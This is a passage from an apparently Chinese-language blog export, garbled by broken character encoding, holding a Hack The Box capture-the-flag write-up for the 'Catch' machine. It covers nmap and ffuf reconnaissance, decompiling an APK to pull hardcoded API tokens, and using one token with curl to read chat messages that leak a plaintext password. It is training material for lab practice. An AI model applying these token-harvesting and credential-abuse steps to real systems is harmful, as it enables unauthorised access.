8721327cc232073b40d27d9c17e7348b # cat /root/root.txt d08c32a5d4f8c8b10e76eb51a69f1a86 æ‹¿åˆ° user æƒé™ å’Œ root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Catch - Hackthebox","slug":"Hackthebox - Catch","date":"2022-04-06T11:38:36.000Z","updated":"2023-05-20T01:28:46.000Z","comments":true,"path":"2022/04/06/Hackthebox - Catch/","link":"","permalink":"http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/","excerpt":"","text":"Hackthebox - Catché¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†NMAPâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.150 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-06 03:34 EDT Nmap scan report for 10.10.11.150 Host is up (0.25s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Catch Global Systems 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=UTF-8 | Set-Cookie: i_like_gitea=229c01ff2c679664; Path=/; HttpOnly | Set-Cookie: _csrf=VFIu8a5yLSGnb8AWF33ofFOqRKE6MTY0OTIzMDUyNDYwMDczNjU5MQ; Path=/; Expires=Thu, 07 Apr 2022 07:35:24 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Wed, 06 Apr 2022 07:35:24 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&gt; | &lt;head data-suburl=&quot;&quot;&gt; | &lt;meta charset=&quot;utf-8&quot;&gt; | &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; | &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt; | &lt;title&gt; Catch Repositories &lt;/title&gt; | &lt;link rel=&quot;manifest&quot; href=&quot;data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Set-Cookie: i_like_gitea=ada0631c19902f31; Path=/; HttpOnly | Set-Cookie: _csrf=Fjvxg_M7Bc_5OS6o7uXWAaUEJCg6MTY0OTIzMDUzMzM1MTAzMTUxNg; Path=/; Expires=Thu, 07 Apr 2022 07:35:33 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Wed, 06 Apr 2022 07:35:33 GMT |_ Content-Length: 0 5000/tcp open upnp? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 302 Found | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Location: /login | Vary: Accept, Accept-Encoding | Content-Type: text/plain; charset=utf-8 | Content-Length: 28 | Set-Cookie: connect.sid=s%3AEQngskGgO4I2xPH7SOxj7INNlQZTOA-7.bWQDiu%2BFXvDOHdHW15rgWh4N9jvQ7KAvrpzZQrh4Vvw; Path=/; HttpOnly | Date: Wed, 06 Apr 2022 07:35:28 GMT | Connection: close | Found. Redirecting to /login | HTTPOptions: | HTTP/1.1 200 OK | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Allow: GET,HEAD | Content-Type: text/html; charset=utf-8 | Content-Length: 8 | ETag: W/&quot;8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg&quot; | Set-Cookie: connect.sid=s%3A-1OGMg8iZf45c1yBQ3QmeijWzg-5hyZy.5H0gXM7aorV%2BeFuutbDUJQn149ThPRcg%2FiKj%2FeVanl0; Path=/; HttpOnly | Vary: Accept-Encoding | Date: Wed, 06 Apr 2022 07:35:31 GMT | Connection: close |_ GET,HEAD 8000/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Catch Global Systems 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port3000-TCP:V=7.91%I=7%D=4/6%Time=624D42BB%P=x86_64-pc-linux-gnu%r(Gen SF:ericLines,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te SF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2 SF:0Request&quot;)%r(GetRequest,14F9,&quot;HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x SF:20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20i_like_gitea=229c01ff2c SF:679664;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=VFIu8a5yLSGnb8AW SF:F33ofFOqRKE6MTY0OTIzMDUyNDYwMDczNjU5MQ;\\x20Path=/;\\x20Expires=Thu,\\x200 SF:7\\x20Apr\\x202022\\x2007:35:24\\x20GMT;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSe SF:t-Cookie:\\x20macaron_flash=;\\x20Path=/;\\x20Max-Age=0;\\x20HttpOnly\\r\\nX- SF:Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x200 SF:7:35:24\\x20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\&quot;en-US\\&quot;\\x20cl SF:ass=\\&quot;theme-\\&quot;&gt;\\n&lt;head\\x20data-suburl=\\&quot;\\&quot;&gt;\\n\\t&lt;meta\\x20charset=\\&quot;utf-8 SF:\\&quot;&gt;\\n\\t&lt;meta\\x20name=\\&quot;viewport\\&quot;\\x20content=\\&quot;width=device-width,\\x20i SF:nitial-scale=1\\&quot;&gt;\\n\\t&lt;meta\\x20http-equiv=\\&quot;x-ua-compatible\\&quot;\\x20content SF:=\\&quot;ie=edge\\&quot;&gt;\\n\\t&lt;title&gt;\\x20Catch\\x20Repositories\\x20&lt;/title&gt;\\n\\t&lt;link\\ SF:x20rel=\\&quot;manifest\\&quot;\\x20href=\\&quot;data:application/json;base64,eyJuYW1lIjoi SF:Q2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyI SF:sInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3 SF:sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz&quot;)%r(Help,67,&quot;HTTP/1\\.1\\x2040 SF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\ SF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(HTTPOptions,17F, SF:&quot;HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nSet-Cookie:\\x20i_like_ SF:gitea=ada0631c19902f31;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf= SF:Fjvxg_M7Bc_5OS6o7uXWAaUEJCg6MTY0OTIzMDUzMzM1MTAzMTUxNg;\\x20Path=/;\\x20E SF:xpires=Thu,\\x2007\\x20Apr\\x202022\\x2007:35:33\\x20GMT;\\x20HttpOnly;\\x20Sa SF:meSite=Lax\\r\\nSet-Cookie:\\x20macaron_flash=;\\x20Path=/;\\x20Max-Age=0;\\x SF:20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Wed,\\x2006\\x20 SF:Apr\\x202022\\x2007:35:33\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(RTSP SF:Request,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text SF:/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20R SF:equest&quot;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port5000-TCP:V=7.91%I=7%D=4/6%Time=624D42C0%P=x86_64-pc-linux-gnu%r(Get SF:Request,23C,&quot;HTTP/1\\.1\\x20302\\x20Found\\r\\nX-Frame-Options:\\x20SAMEORIGI SF:N\\r\\nX-Download-Options:\\x20noopen\\r\\nX-Content-Type-Options:\\x20nosnif SF:f\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nContent-Security-Policy:\\ SF:x20\\r\\nX-Content-Security-Policy:\\x20\\r\\nX-WebKit-CSP:\\x20\\r\\nX-UA-Comp SF:atible:\\x20IE=Edge,chrome=1\\r\\nLocation:\\x20/login\\r\\nVary:\\x20Accept,\\ SF:x20Accept-Encoding\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n SF:Content-Length:\\x2028\\r\\nSet-Cookie:\\x20connect\\.sid=s%3AEQngskGgO4I2xP SF:H7SOxj7INNlQZTOA-7\\.bWQDiu%2BFXvDOHdHW15rgWh4N9jvQ7KAvrpzZQrh4Vvw;\\x20P SF:ath=/;\\x20HttpOnly\\r\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x2007:35:28\\x2 SF:0GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nFound\\.\\x20Redirecting\\x20to\\x20/lo SF:gin&quot;)%r(RTSPRequest,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnectio SF:n:\\x20close\\r\\n\\r\\n&quot;)%r(DNSVersionBindReqTCP,2F,&quot;HTTP/1\\.1\\x20400\\x20Ba SF:d\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(SMBProgNeg,2F,&quot;HTTP/1\\ SF:.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(ZendJav SF:aBridge,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n&quot;)%r(HTTPOptions,247,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Frame-Options: SF:\\x20SAMEORIGIN\\r\\nX-Download-Options:\\x20noopen\\r\\nX-Content-Type-Optio SF:ns:\\x20nosniff\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nContent-Secu SF:rity-Policy:\\x20\\r\\nX-Content-Security-Policy:\\x20\\r\\nX-WebKit-CSP:\\x20 SF:\\r\\nX-UA-Compatible:\\x20IE=Edge,chrome=1\\r\\nAllow:\\x20GET,HEAD\\r\\nConte SF:nt-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x208\\r\\nETag SF::\\x20W/\\&quot;8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\\&quot;\\r\\nSet-Cookie:\\x20connect\\.sid SF:=s%3A-1OGMg8iZf45c1yBQ3QmeijWzg-5hyZy\\.5H0gXM7aorV%2BeFuutbDUJQn149ThPR SF:cg%2FiKj%2FeVanl0;\\x20Path=/;\\x20HttpOnly\\r\\nVary:\\x20Accept-Encoding\\r SF:\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x2007:35:31\\x20GMT\\r\\nConnection:\\ SF:x20close\\r\\n\\r\\nGET,HEAD&quot;)%r(RPCCheck,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Re SF:quest\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(DNSStatusRequestTCP,2F,&quot;HTTP/ SF:1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(Help, SF:2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot; SF:); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/6%OT=22%CT=1%CU=30269%PV=Y%DS=2%DC=T%G=Y%TM=624D4342 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=10 OS:5%GCD=3%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3 OS:=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=F OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 110/tcp) HOP RTT ADDRESS 1 276.00 ms 10.10.14.1 2 276.19 ms 10.10.11.150 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 160.41 seconds HTTP80 ç«¯å£ è®¿é—®åå‘ç°ä»»ä½•é¡µé¢ï¼Œé™¤äº†ä¸‹è½½ apk ä»¥å¤–ï¼Œéƒ½æ— æ³•ç‚¹ã€‚ æ¥ç€æˆ‘åšäº†ä¸€ä¸‹ fuzzï¼Œä¹Ÿå¹¶æ²¡æœ‰ä¸œè¥¿ï¼Œå…ˆæŠŠ apk æ–‡ä»¶ä¸‹è½½ä¸‹æ¥å§ï¼ŒåŒæ—¶å»çœ‹çœ‹å…¶ä»–å†…å®¹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.11.150/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.150/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ javascript [Status: 301, Size: 317, Words: 20, Lines: 10] server-status [Status: 403, Size: 277, Words: 20, Lines: 10] [Status: 200, Size: 6163, Words: 855, Lines: 375] :: Progress: [20116/20116] :: Job [1/1] :: 112 req/sec :: Duration: [0:02:39] :: Errors: 0 :: æ²¡æœ‰å†…å®¹ 5000 ç«¯å£ 5000 ç«¯å£æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œä½†æ˜¯ä¼¼ä¹æ²¡æœ‰è´¦å· â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.11.150:5000/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.150:5000/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ logout [Status: 302, Size: 28, Words: 4, Lines: 1] media [Status: 301, Size: 177, Words: 7, Lines: 11] login [Status: 200, Size: 2622, Words: 709, Lines: 57] files [Status: 401, Size: 12, Words: 1, Lines: 1] users [Status: 401, Size: 12, Words: 1, Lines: 1] account [Status: 401, Size: 12, Words: 1, Lines: 1] Login [Status: 200, Size: 2622, Words: 709, Lines: 57] Connections [Status: 401, Size: 12, Words: 1, Lines: 1] connections [Status: 401, Size: 12, Words: 1, Lines: 1] Files [Status: 401, Size: 12, Words: 1, Lines: 1] messages [Status: 401, Size: 12, Words: 1, Lines: 1] Account [Status: 401, Size: 12, Words: 1, Lines: 1] Media [Status: 301, Size: 177, Words: 7, Lines: 11] Users [Status: 401, Size: 12, Words: 1, Lines: 1] FILES [Status: 401, Size: 12, Words: 1, Lines: 1] Logout [Status: 302, Size: 28, Words: 4, Lines: 1] Messages [Status: 401, Size: 12, Words: 1, Lines: 1] [Status: 302, Size: 28, Words: 4, Lines: 1] rooms [Status: 401, Size: 12, Words: 1, Lines: 1] MEDIA [Status: 301, Size: 177, Words: 7, Lines: 11] CONNECTIONS [Status: 401, Size: 12, Words: 1, Lines: 1] LOGIN [Status: 200, Size: 2627, Words: 709, Lines: 57] :: Progress: [20116/20116] :: Job [1/1] :: 77 req/sec :: Duration: [0:05:20] :: Errors: 0 :: ä¸œè¥¿è¿˜æŒºå¤šï¼Œå»çœ‹ä¸€ä¸‹ æç¤º Unauthorized æ²¡æœ‰ä»¤ç‰Œå˜›ï¼Œæ¯•ç«Ÿæ²¡æœ‰ç™»é™† 8000 ç«¯å£ ä¼¼ä¹æ˜¯ä¸€ä¸ªç³»ç»Ÿè¿è¡Œç›‘æ§çš„ï¼Œç„¶åç‚¹å‡»ä¸‹é¢çš„ä»ªè¡¨ç›˜ä¼šè¿›å…¥ä¸€ä¸ªç™»å½•é¡µé¢ è¯•äº†å‡ ä¸ªå¼±å£ä»¤éƒ½æ— æ³•è¿›å»ï¼Œå»çœ‹çœ‹ apk æ–‡ä»¶å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.11.150:8000/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.150:8000/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ admin [Status: 302, Size: 386, Words: 60, Lines: 12] img [Status: 301, Size: 317, Words: 20, Lines: 10] fonts [Status: 301, Size: 319, Words: 20, Lines: 10] setup [Status: 302, Size: 382, Words: 60, Lines: 12] dashboard [Status: 302, Size: 386, Words: 60, Lines: 12] storage [Status: 403, Size: 279, Words: 20, Lines: 10] dist [Status: 301, Size: 318, Words: 20, Lines: 10] server-status [Status: 403, Size: 279, Words: 20, Lines: 10] [Status: 200, Size: 8870, Words: 1951, Lines: 302] :: Progress: [20116/20116] :: Job [1/1] :: 70 req/sec :: Duration: [0:05:55] :: Errors: 0 :: ä¹Ÿæ²¡å•¥å¯çœ‹çš„ä¸œè¥¿ Apkä½¿ç”¨ apktool è¿›è¡Œåç¼–è¯‘ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch] â””â”€# apktool d catchv1.0.apk Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true I: Using Apktool 2.5.0-dirty on catchv1.0.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... ç„¶åæŸ¥æ‰¾ä¸€ä¸‹ token â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch] â””â”€# grep -rn token catchv1.0/res/values/strings.xml 43: &lt;string name=&quot;gitea_token&quot;&gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt; 47: &lt;string name=&quot;lets_chat_token&quot;&gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&lt;/string&gt; 104: &lt;string name=&quot;slack_token&quot;&gt;xoxp-23984754863-2348975623103&lt;/string&gt; åœ¨ /catchv1.0/res/values/string.xml ä¸‹çš„ç¬¬ 47 è¡Œæœ‰ä¸€ä¸ª lets_chat_token ï¼Œåº”è¯¥å°±æ˜¯è¿™ä¸ªäº†ï¼Œæ¥åˆ©ç”¨ä¸€ä¸‹å§ æ¼æ´åˆ©ç”¨ä½¿ç”¨ä»¤ç‰Œæˆæƒè¿›è¡Œè¯»å– â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl -H &#39;Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&#39; &#39;http://10.10.11.150:5000/rooms&#39; [{&quot;id&quot;:&quot;61b86b28d984e2451036eb17&quot;,&quot;slug&quot;:&quot;status&quot;,&quot;name&quot;:&quot;Status&quot;,&quot;description&quot;:&quot;Cachet Updates and Maintenance&quot;,&quot;lastActive&quot;:&quot;2021-12-14T10:34:20.749Z&quot;,&quot;created&quot;:&quot;2021-12-14T10:00:08.384Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;private&quot;:false,&quot;hasPassword&quot;:false,&quot;participants&quot;:[]},{&quot;id&quot;:&quot;61b8708efe190b466d476bfb&quot;,&quot;slug&quot;:&quot;android_dev&quot;,&quot;name&quot;:&quot;Android Development&quot;,&quot;description&quot;:&quot;Android App Updates, Issues &amp; More&quot;,&quot;lastActive&quot;:&quot;2021-12-14T10:24:21.145Z&quot;,&quot;created&quot;:&quot;2021-12-14T10:23:10.474Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;private&quot;:false,&quot;hasPassword&quot;:false,&quot;participants&quot;:[]},{&quot;id&quot;:&quot;61b86b3fd984e2451036eb18&quot;,&quot;slug&quot;:&quot;employees&quot;,&quot;name&quot;:&quot;Employees&quot;,&quot;description&quot;:&quot;New Joinees, Org updates&quot;,&quot;lastActive&quot;:&quot;2021-12-14T10:18:04.710Z&quot;,&quot;created&quot;:&quot;2021-12-14T10:00:31.043Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;private&quot;:false,&quot;hasPassword&quot;:false,&quot;participants&quot;:[]}] è¯»å–ä¸€ä¸‹ rooms çš„å†…å®¹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl -H &#39;Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&#39; &#39;http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages&#39; [{&quot;id&quot;:&quot;61b8732cfe190b466d476c02&quot;,&quot;text&quot;:&quot;ah sure!&quot;,&quot;posted&quot;:&quot;2021-12-14T10:34:20.749Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b8731ffe190b466d476c01&quot;,&quot;text&quot;:&quot;You should actually include this task to your list as well as a part of quarterly audit&quot;,&quot;posted&quot;:&quot;2021-12-14T10:34:07.449Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b872b9fe190b466d476c00&quot;,&quot;text&quot;:&quot;Also make sure we&#39;ve our systems, applications and databases up-to-date.&quot;,&quot;posted&quot;:&quot;2021-12-14T10:32:25.514Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87282fe190b466d476bff&quot;,&quot;text&quot;:&quot;Excellent! &quot;,&quot;posted&quot;:&quot;2021-12-14T10:31:30.403Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87277fe190b466d476bfe&quot;,&quot;text&quot;:&quot;Why not. We&#39;ve this in our todo list for next quarter&quot;,&quot;posted&quot;:&quot;2021-12-14T10:31:19.094Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87241fe190b466d476bfd&quot;,&quot;text&quot;:&quot;@john is it possible to add SSL to our status domain to make sure everything is secure ? &quot;,&quot;posted&quot;:&quot;2021-12-14T10:30:25.108Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b8702dfe190b466d476bfa&quot;,&quot;text&quot;:&quot;Here are the credentials `john : E}V!mywu_69T4C}W`&quot;,&quot;posted&quot;:&quot;2021-12-14T10:21:33.859Z&quot;,&quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87010fe190b466d476bf9&quot;,&quot;text&quot;:&quot;Sure one sec.&quot;,&quot;posted&quot;:&quot;2021-12-14T10:21:04.635Z&quot;,&quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b86fb1fe190b466d476bf8&quot;,&quot;text&quot;:&quot;Can you create an account for me ? &quot;,&quot;posted&quot;:&quot;2021-12-14T10:19:29.677Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b86f4dfe190b466d476bf6&quot;,&quot;text&quot;:&quot;Hey Team! I&#39;ll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. &quot;,&quot;posted&quot;:&quot;2021-12-14T10:17:49.761Z&quot;,&quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}] ç»§ç»­è¯»å–ä¸€ä¸‹æˆ¿é—´å†…çš„æ¶ˆæ¯ username 